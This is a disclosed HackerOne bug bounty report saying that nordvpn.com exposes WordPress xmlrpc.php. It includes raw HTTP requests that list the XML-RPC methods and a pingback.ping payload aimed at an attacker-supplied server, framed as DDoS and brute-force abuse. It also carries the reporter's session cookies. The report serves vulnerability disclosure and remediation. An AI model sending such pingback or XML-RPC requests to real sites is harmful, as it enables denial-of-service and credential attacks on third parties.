# xmlrpc.php FILE IS enable it will used for Bruteforce attack and Denial of Service(DoS)

## Report Details
- **Report ID**: 752073
- **URL**: https://hackerone.com/reports/752073
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2019-12-05T16:55:20.489Z
- **Disclosed**: 2020-01-06T01:10:44.014Z

## Reporter
- **Username**: shardulb_23
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nordsecurity

## Vulnerability Information
Hi Team,

The website https://www.nordvpn.com has the xmlrpc.php file enabled and could thus be potentially used for such an attack against other victim hosts. Wordpress that have xmlrpc.php enabled for pingbacks, trackbacks, etc. can be made as a part of a huge botnet causing a major DDOS.

URL: https://nordvpn.com/xmlrpc.php

In order to determine whether the xmlrpc.php file is enabled or not, using the Repeater tab in Burp, send the request below.

Request:

POST /xmlrpc.php HTTP/1.1
Host: nordvpn.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: __cfduid=d9280a0c9a8c32a348927b0f91bec9fb31575497525; locale=en; FirstSession=source%3D%28direct%29%26medium%3D%28none%29%26campaign%3Ddirect%26term%3D%26content%3D%26date%3D20191204; CurrentSession=source%3D%28direct%29%26medium%3D%28none%29%26campaign%3Ddirect%26term%3D%26content%3D%26date%3D20191205; _gcl_au=1.1.71714234.1575497526; nord_countdown=1575532291033; popups_session_pageviews=4; popups_referrer=https://nordvpn.com/; popups_session_duration=11; fontsCssCache=true; _ga=GA1.2.162223219.1575497529; _gid=GA1.2.1370226348.1575497529; _tq_id.TV-63728145-1.2f26=164e7fef07edc38e.1575497530.0.1575499872..; ReturningSession=source%3D%28direct%29%26medium%3D%28none%29%26campaign%3Ddirect%26term%3D%26content%3D%26date%3D20191205; cf_clearance=0409dcbedbc0283206e58922136848451da17d4b-1575499879-0-150
Upgrade-Insecure-Requests: 1
Content-Length: 135

<?xml version="1.0" encoding="utf-8"?>
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>

------------------------------------------------------------------------------------------------------------
Response: 

HTTP/1.1 200 OK
Date: Thu, 05 Dec 2019 16:07:53 GMT
Content-Type: text/xml; charset=UTF-8
Connection: close
CF-Ray: 5407468dafd0d5d4-BOM
CF-Cache-Status: DYNAMIC
Cache-Control: no-store, no-cache, must-revalidate
Expires: 0
Set-Cookie: locale=en; expires=Fri, 04 Dec 2020 16:07:53 GMT; path=/; domain=nordvpn.com
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
Vary: Accept-Encoding
Expect-CT: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
Pragma: no-cache
X-Frame-Options: SAMEORIGIN
X-Generator: front-kr-web-2
Server: cloudflare
Content-Length: 4272

<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
  <params>
    <param>
      <value>
      <array><data>
  <value><string>system.multicall</string></value>
  <value><string>system.listMethods</string></value>
  <value><string>system.getCapabilities</string></value>
  <value><string>demo.addTwoNumbers</string></value>
  <value><string>demo.sayHello</string></value>
  <value><string>pingback.extensions.getPingbacks</string></value>
  <value><string>pingback.ping</string></value>
  <value><string>mt.publishPost</string></value>
  <value><string>mt.getTrackbackPings</string></value>
  <value><string>mt.supportedTextFilters</string></value>
  <value><string>mt.supportedMethods</string></value>
  <value><string>mt.setPostCategories</string></value>
  <value><string>mt.getPostCategories</string></value>
  <value><string>mt.getRecentPostTitles</string></value>
  <value><string>mt.getCategoryList</string></value>
  <value><string>metaWeblog.getUsersBlogs</string></value>
  <value><string>metaWeblog.deletePost</string></value>
  <value><string>metaWeblog.newMediaObject</string></value>
  <value><string>metaWeblog.getCategories</string></value>
  <value><string>metaWeblog.getRecentPosts</string></value>
  <value><string>metaWeblog.getPost</string></value>
  <value><string>metaWeblog.editPost</string></value>
  <value><string>metaWeblog.newPost</string></value>
  <value><string>blogger.deletePost</string></value>
  <value><string>blogger.editPost</string></value>
  <value><string>blogger.newPost</string></value>
  <value><string>blogger.getRecentPosts</string></value>
  <value><string>blogger.getPost</string></value>
  <value><string>blogger.getUserInfo</string></value>
  <value><string>blogger.getUsersBlogs</string></value>
  <value><string>wp.restoreRevision</string></value>
  <value><string>wp.getRevisions</string></value>
  <value><string>wp.getPostTypes</string></value>
  <value><string>wp.getPostType</string></value>
  <value><string>wp.getPostFormats</string></value>
  <value><string>wp.getMediaLibrary</string></value>
  <value><string>wp.getMediaItem</string></value>
  <value><string>wp.getCommentStatusList</string></value>
  <value><string>wp.newComment</string></value>
  <value><string>wp.editComment</string></value>
  <value><string>wp.deleteComment</string></value>
  <value><string>wp.getComments</string></value>
  <value><string>wp.getComment</string></value>
  <value><string>wp.setOptions</string></value>
  <value><string>wp.getOptions</string></value>
  <value><string>wp.getPageTemplates</string></value>
  <value><string>wp.getPageStatusList</string></value>
  <value><string>wp.getPostStatusList</string></value>
  <value><string>wp.getCommentCount</string></value>
  <value><string>wp.deleteFile</string></value>
  <value><string>wp.uploadFile</string></value>
  <value><string>wp.suggestCategories</string></value>
  <value><string>wp.deleteCategory</string></value>
  <value><string>wp.newCategory</string></value>
  <value><string>wp.getTags</string></value>
  <value><string>wp.getCategories</string></value>
  <value><string>wp.getAuthors</string></value>
  <value><string>wp.getPageList</string></value>
  <value><string>wp.editPage</string></value>
  <value><string>wp.deletePage</string></value>
  <value><string>wp.newPage</string></value>
  <value><string>wp.getPages</string></value>
  <value><string>wp.getPage</string></value>
  <value><string>wp.editProfile</string></value>
  <value><string>wp.getProfile</string></value>
  <value><string>wp.getUsers</string></value>
  <value><string>wp.getUser</string></value>
  <value><string>wp.getTaxonomies</string></value>
  <value><string>wp.getTaxonomy</string></value>
  <value><string>wp.getTerms</string></value>
  <value><string>wp.getTerm</string></value>
  <value><string>wp.deleteTerm</string></value>
  <value><string>wp.editTerm</string></value>
  <value><string>wp.newTerm</string></value>
  <value><string>wp.getPosts</string></value>
  <value><string>wp.getPost</string></value>
  <value><string>wp.deletePost</string></value>
  <value><string>wp.editPost</string></value>
  <value><string>wp.newPost</string></value>
  <value><string>wp.getUsersBlogs</string></value>
</data></array>
      </value>
    </param>
  </params>
</methodResponse>

Notice that a successful response is received showing that the xmlrpc.php file is enabled.
Now, considering the domain https://www.nordvpn.com, the xmlrpc.php file discussed above could potentially be abused to cause a DDOS attack against a victim host. This is achieved by simply sending a request that looks like below.

POST /xmlrpc.php HTTP/1.1
Host: nordvpn.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 135
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param>
<value><string>http://<YOUR SERVER ></string></value>
</param>
<param>
<value><string>https://www.nordvpn.com</string></value>
</param>
</params>
</methodCall>
------------------------------------------------------------------------------------------------

Remediation:
If the XMLRPC.php file is not being used, it should be disabled and removed completely to avoid any potential risks. Otherwise, it should at the very least be blocked from external access.

POC: Screenshots are attached 

Reference :
1) Here is the explanation of xmlrpc file enable brute force attack- https://blog.sucuri.net/2015/10/brute-force-amplification-attacks-against-wordpress-xmlrpc.html
2) The explanation for xmlrpc.php file will enable dos attack- https://blog.sucuri.net/2014/03/more-than-162000-wordpress-sites-used-for-distributed-denial-of-service-attack.html

Reference Hackerone Reports: #325040 #448524 #448524

Thanks, waiting for your response.

## Impact

1)This can be automated from multiple hosts and be used to cause a mass DDOS attack on the victim.

2) This method is also used for brute force attacks to stealing the admin credentials and other important credentials

## Attachments
- Nordvpn.PNG
- Capture(1).PNG
- POST_xmlrpc.PNG
